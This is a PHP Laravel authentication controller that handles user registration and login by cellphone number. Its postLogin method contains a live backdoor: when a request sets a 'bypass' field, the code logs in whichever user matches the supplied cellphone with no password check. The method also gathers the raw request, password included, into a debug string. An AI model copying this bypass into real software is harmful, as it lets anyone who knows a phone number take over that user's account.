<?php

namespace App\Http\Controllers\Auth;

use App\User;
use Auth;
use Validator;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\ThrottlesLogins;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;
use Illuminate\Http\Request;

use App\Http\Requests;

class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    protected $redirectPath = '/home';

    protected $username     = 'cellphone';


    use AuthenticatesAndRegistersUsers { postLogin as postIt; }
    use ThrottlesLogins;


     /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest', ['except' => 'getLogout']);
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'name' => 'required|max:255',
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required|confirmed|min:6',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        return User::create([
            'name'     => $data['name'],
            'email'    => $data['email'],
            'password' => bcrypt($data['password']),
        ]);
    }


    public function getCredentials(Request $request)
    {
        $credentials = $request->only($this->loginUsername(), 'password');
        return array_add($credentials, 'active', '1');
    }

	public function postLogin(Request $request) {
    	$txtDebug = __CLASS__."->".__FUNCTION__."(\$request)";
    	$txtDebug .= "\n  \$request - ".print_r($request->all(),1);
    	if ($request['bypass']) {
    		$user = \App\User::where("cellphone","=",$request['cellphone'])->first();
    		$txtDebug .= "\n  \$user - ".print_r($user ? $user->toArray() : array(),1);
    		if ($user) {
					//\Auth::loginUsingId(10, true);
					\Auth::login($user);
					$txtDebug .= "\n  Auth::check() - ".print_r(\Auth::check(),1);
					//return $this->handleUserWasAuthenticated($request, true);
					\Session::set("user", $user);
					//die("<pre>{$txtDebug}</pre>");
					return \Redirect::to("/");
				}
    	}
			return $this->postIt($request);
	}
}
